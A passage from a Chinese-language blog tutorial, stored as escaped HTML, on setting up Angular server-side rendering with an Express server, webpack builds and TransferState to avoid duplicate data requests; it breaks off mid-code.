class=\"heading\"\u003e搭建过程\u003c/h2\u003e\n\u003cp\u003e首先安装服务端的依赖\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eyarn add @angular/platform-server express\nyarn add -D ts-loader webpack-node-externals npm-run-all\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e这里需要注意的是 \u003ccode\u003e@angular/platform-server\u003c/code\u003e 的版本号最好根据当前 angular 版本进行安装，如: \u003ccode\u003e@angular/platform-server@5.1.0\u003c/code\u003e，避免与其它依赖有版本冲突。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e创建文件: \u003ccode\u003esrc/app/app.server.module.ts\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { NgModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/core'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { ServerModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-server'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { AppModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./app.module'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { AppComponent } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./app.component'\u003c/span\u003e\n\n@NgModule({\n  \u003cspan class=\"hljs-attr\"\u003eimports\u003c/span\u003e: [\n    AppModule,\n    ServerModule\n  ],\n  \u003cspan class=\"hljs-attr\"\u003ebootstrap\u003c/span\u003e: [AppComponent],\n})\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAppServerModule\u003c/span\u003e \u003c/span\u003e{ }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e更新文件: \u003ccode\u003esrc/app/app.module.ts\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { BrowserModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-browser'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { NgModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/core'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { AppComponent } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./app.component'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n\n@NgModule({\n  \u003cspan class=\"hljs-attr\"\u003edeclarations\u003c/span\u003e: [\n    AppComponent\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n  ],\n  \u003cspan class=\"hljs-attr\"\u003eimports\u003c/span\u003e: [\n    BrowserModule.withServerTransition({ \u003cspan class=\"hljs-attr\"\u003eappId\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'udao'\u003c/span\u003e })\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n  ],\n  \u003cspan class=\"hljs-attr\"\u003eproviders\u003c/span\u003e: [],\n  \u003cspan class=\"hljs-attr\"\u003ebootstrap\u003c/span\u003e: [AppComponent]\n})\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAppModule\u003c/span\u003e \u003c/span\u003e{ }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们需要一个主文件来导出服务端模块\u003c/p\u003e\n\u003cp\u003e创建文件: \u003ccode\u003esrc/main.server.ts\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e { AppServerModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./app/app.server.module'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在来更新 \u003ccode\u003e@angular/cli\u003c/code\u003e 的配置文件 \u003ccode\u003e.angular-cli.json\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs json\" lang=\"json\"\u003e{\n  \u003cspan class=\"hljs-attr\"\u003e\"$schema\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"./node_modules/@angular/cli/lib/config/schema.json\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003e\"project\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"udao\"\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-attr\"\u003e\"apps\"\u003c/span\u003e: [\n    {\n      \u003cspan class=\"hljs-attr\"\u003e\"root\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"src\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"outDir\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"dist/browser\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"assets\"\u003c/span\u003e: [\n        \u003cspan class=\"hljs-string\"\u003e\"assets\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"favicon.ico\"\u003c/span\u003e\n      ]\n      // ...\n    },\n    {\n      \u003cspan class=\"hljs-attr\"\u003e\"platform\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"server\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"root\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"src\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"outDir\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"dist/server\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"assets\"\u003c/span\u003e: [],\n      \u003cspan class=\"hljs-attr\"\u003e\"index\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"index.html\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"main\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"main.server.ts\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"test\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"test.ts\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"tsconfig\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"tsconfig.server.json\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"testTsconfig\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"tsconfig.spec.json\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"prefix\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"scripts\"\u003c/span\u003e: [],\n      \u003cspan class=\"hljs-attr\"\u003e\"environmentSource\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"environments/environment.ts\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003e\"environments\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003e\"dev\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"environments/environment.ts\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003e\"prod\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"environments/environment.prod.ts\"\u003c/span\u003e\n      }\n    }\n  ]\n  // ...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的 \u003ccode\u003e// ...\u003c/code\u003e 代表省略掉，但是 json 没有注释一说，看着怪怪的....\u003c/p\u003e\n\u003cp\u003e当然 \u003ccode\u003e.angular-cli.json\u003c/code\u003e 的配置不是固定的，根据需求自行修改\u003c/p\u003e\n\u003cp\u003e我们需要为服务端创建 \u003ccode\u003etsconfig\u003c/code\u003e 配置文件: \u003ccode\u003esrc/tsconfig.server.json\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs json\" lang=\"json\"\u003e{\n  \u003cspan class=\"hljs-attr\"\u003e\"extends\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"../tsconfig.json\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003e\"compilerOptions\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003e\"outDir\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"../out-tsc/app\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003e\"baseUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"./\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003e\"module\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"commonjs\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003e\"types\"\u003c/span\u003e: []\n  },\n  \u003cspan class=\"hljs-attr\"\u003e\"exclude\"\u003c/span\u003e: [\n    \u003cspan class=\"hljs-string\"\u003e\"test.ts\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"**/*.spec.ts\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"server.ts\"\u003c/span\u003e\n  ],\n  \u003cspan class=\"hljs-attr\"\u003e\"angularCompilerOptions\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003e\"entryModule\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"app/app.server.module#AppServerModule\"\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后更新: \u003ccode\u003esrc/tsconfig.app.json\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs json\" lang=\"json\"\u003e{\n  \u003cspan class=\"hljs-attr\"\u003e\"extends\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"../tsconfig.json\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003e\"compilerOptions\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003e\"outDir\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"../out-tsc/app\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003e\"baseUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"./\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003e\"module\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"es2015\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003e\"types\"\u003c/span\u003e: []\n  },\n  \u003cspan class=\"hljs-attr\"\u003e\"exclude\"\u003c/span\u003e: [\n    \u003cspan class=\"hljs-string\"\u003e\"test.ts\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"**/*.spec.ts\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"server.ts\"\u003c/span\u003e\n  ]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在可以执行以下命令，看配置是否有效\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eng build -prod --build-optimizer --app 0\nng build --aot --app 1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行结果应该如下图所示\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb6e35b7a3218?w=1388\u0026amp;h=622\u0026amp;f=png\u0026amp;s=-1\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e然后就是创建 \u003ccode\u003eExpress.js\u003c/code\u003e 服务, 创建文件: \u003ccode\u003esrc/server.ts\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'reflect-metadata'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'zone.js/dist/zone-node'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { renderModuleFactory } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-server'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { enableProdMode } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/core'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e * \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e express \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'express'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { join } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { readFileSync } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e\n\nenableProdMode();\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e PORT = process.env.PORT || \u003cspan class=\"hljs-number\"\u003e4200\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e DIST_FOLDER = join(process.cwd(), \u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e app = express()\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e template = readFileSync(join(DIST_FOLDER, \u003cspan class=\"hljs-string\"\u003e'browser'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e)).toString()\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { AppServerModuleNgFactory } = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'main.server'\u003c/span\u003e)\n\napp.engine(\u003cspan class=\"hljs-string\"\u003e'html'\u003c/span\u003e, (_, options, callback) =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e opts = { \u003cspan class=\"hljs-attr\"\u003edocument\u003c/span\u003e: template, \u003cspan class=\"hljs-attr\"\u003eurl\u003c/span\u003e: options.req.url }\n\n  renderModuleFactory(AppServerModuleNgFactory, opts)\n    .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ehtml\u003c/span\u003e =\u0026gt;\u003c/span\u003e callback(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, html))\n});\n\napp.set(\u003cspan class=\"hljs-string\"\u003e'view engine'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'html'\u003c/span\u003e)\napp.set(\u003cspan class=\"hljs-string\"\u003e'views'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'src'\u003c/span\u003e)\n\napp.get(\u003cspan class=\"hljs-string\"\u003e'*.*'\u003c/span\u003e, express.static(join(DIST_FOLDER, \u003cspan class=\"hljs-string\"\u003e'browser'\u003c/span\u003e)))\n\napp.get(\u003cspan class=\"hljs-string\"\u003e'*'\u003c/span\u003e, (req, res) =\u0026gt; {\n  res.render(\u003cspan class=\"hljs-string\"\u003e'index'\u003c/span\u003e, { req })\n})\n\napp.listen(PORT, () =\u0026gt; {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`listening on http://localhost:\u003cspan class=\"hljs-subst\"\u003e${PORT}\u003c/span\u003e!`\u003c/span\u003e)\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e理所当然需要一个 webpack 配置文件来打包 \u003ccode\u003eserver.ts\u003c/code\u003e 文件: \u003ccode\u003ewebpack.config.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e nodeExternals = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'webpack-node-externals'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003eentry\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003eserver\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'./src/server.ts'\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-attr\"\u003eresolve\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003eextensions\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e'.ts'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'.js'\u003c/span\u003e],\n    \u003cspan class=\"hljs-attr\"\u003ealias\u003c/span\u003e: {\n      \u003cspan class=\"hljs-string\"\u003e'main.server'\u003c/span\u003e: path.join(__dirname, \u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'server'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'main.bundle.js'\u003c/span\u003e)\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003etarget\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'node'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eexternals\u003c/span\u003e: [nodeExternals()],\n  \u003cspan class=\"hljs-attr\"\u003eoutput\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: path.join(__dirname, \u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e),\n    \u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'[name].js'\u003c/span\u003e\n  },\n  \u003cspan class=\"hljs-attr\"\u003emodule\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003erules\u003c/span\u003e: [\n      { \u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/\\.ts$/\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003eloader\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'ts-loader'\u003c/span\u003e }\n    ]\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为了打包方便最好在 \u003ccode\u003epackage.json\u003c/code\u003e 里面加几行脚本，如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs json\" lang=\"json\"\u003e\"scripts\": {\n  \"ng\": \"ng\",\n  \"start\": \"ng serve\",\n  \"build\": \"run-s build:client build:aot build:server\",\n  \"build:client\": \"ng build -prod --build-optimizer --app 0\",\n  \"build:aot\": \"ng build --aot --app 1\",\n  \"build:server\": \"webpack -p\",\n  \"test\": \"ng test\",\n  \"lint\": \"ng lint\",\n  \"e2e\": \"ng e2e\"\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在尝试运行 \u003ccode\u003enpm run build\u003c/code\u003e，将会看到如下输出：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb6e359907fd7?w=1384\u0026amp;h=1192\u0026amp;f=png\u0026amp;s=-1\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003enode 运行刚刚打包好的 \u003ccode\u003enode dist/server.js\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e打开 \u003ccode\u003ehttp://localhost:4200/\u003c/code\u003e 会正常显示项目主页面\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160bb6e359c89bea?w=1428\u0026amp;h=766\u0026amp;f=png\u0026amp;s=-1\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从上面的开发者工具可以看出 html 文档是服务端渲染直出的，接下来尝试请求数据试一下。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意：本项目显式（菜单可点击）的几个路由初始化都没有请求数据，但是单词解释的详情页是会在 \u003ccode\u003engOnInit()\u003c/code\u003e 方法里获取数据，例如：\u003ccode\u003ehttp://localhost:4200/detail/add\u003c/code\u003e 直接打开时会发生奇怪的现象，请求在服务端和客户端分别发送一次，正常的服务端渲染项目首屏初始化数据的请求在服务端执行，在客户端不会二次请求!\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e发现问题后，就来踩平这个坑\u003c/p\u003e\n\u003cp\u003e试想如果采用一个标记来区分服务端是否已经拿到了数据，如果没拿到数据就在客户端请求，如果已经拿到数据就不发请求\u003c/p\u003e\n\u003cp\u003e当然 Angular 早有一手准备，那就是 \u003ccode\u003eAngular Modules for Transfer State\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么如何真实运用呢？见下文\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e请求填坑\u003c/h2\u003e\n\u003cp\u003e在服务端入口和客户端入口分别引入 \u003ccode\u003eTransferStateModule\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { ServerModule, ServerTransferStateModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-server'\u003c/span\u003e;\n\u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n\n@NgModule({\n  \u003cspan class=\"hljs-attr\"\u003eimports\u003c/span\u003e: [\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n    ServerModule,\n    ServerTransferStateModule\n  ]\n  \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n})\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAppServerModule\u003c/span\u003e \u003c/span\u003e{ }\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { BrowserModule, BrowserTransferStateModule } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-browser'\u003c/span\u003e;\n\u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n\n@NgModule({\n  \u003cspan class=\"hljs-attr\"\u003edeclarations\u003c/span\u003e: [\n    AppComponent\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n  ],\n  \u003cspan class=\"hljs-attr\"\u003eimports\u003c/span\u003e: [\n    BrowserModule.withServerTransition({ \u003cspan class=\"hljs-attr\"\u003eappId\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'udao'\u003c/span\u003e }),\n    BrowserTransferStateModule\n    \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n  ]\n  \u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n})\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAppModule\u003c/span\u003e \u003c/span\u003e{ }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以本项目为例在 \u003ccode\u003edetail.component.ts\u003c/code\u003e 里面，修改如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { Component, OnInit } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/core'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { HttpClient } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/common/http'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { Router,  ActivatedRoute, NavigationEnd } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/router'\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { TransferState, makeStateKey } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'@angular/platform-browser'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e DETAIL_KEY = makeStateKey(\u003cspan class=\"hljs-string\"\u003e'detail'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eDetailComponent\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eimplements\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eOnInit\u003c/span\u003e \u003c/span\u003e{\n  details: any\n\n  \u003cspan class=\"hljs-comment\"\u003e// some variable\u003c/span\u003e\n\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(\n    private http: HttpClient,\n    private state: TransferState,\n    private route: ActivatedRoute,\n    private router: Router\n  ) {}\n\n  transData (res) {\n    \u003cspan class=\"hljs-comment\"\u003e// translate res data\u003c/span\u003e\n  }\n\n  ngOnInit () {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.details = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.get(DETAIL_KEY, \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e any)\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.details) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.route.params.subscribe(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eparams\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.loading = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e apiURL = \u003cspan class=\"hljs-string\"\u003e`https://dict.youdao.com/jsonapi?q=\u003cspan class=\"hljs-subst\"\u003e${params[\u003cspan class=\"hljs-string\"\u003e'word'\u003c/span\u003e]}\u003c/span\u003e`\u003c/span\u003e\n\n        \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.http.get(\u003cspan class=\"hljs-string\"\u003e`/?url=\u003cspan class=\"hljs-subst\"\u003e${\u003cspan class=\"hljs-built_in\"\u003eencodeURIComponent\u003c/span\u003e(apiURL)}\u003c/span\u003e`\u003c/span\u003e)\n        .subscribe(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n          \u003cspan 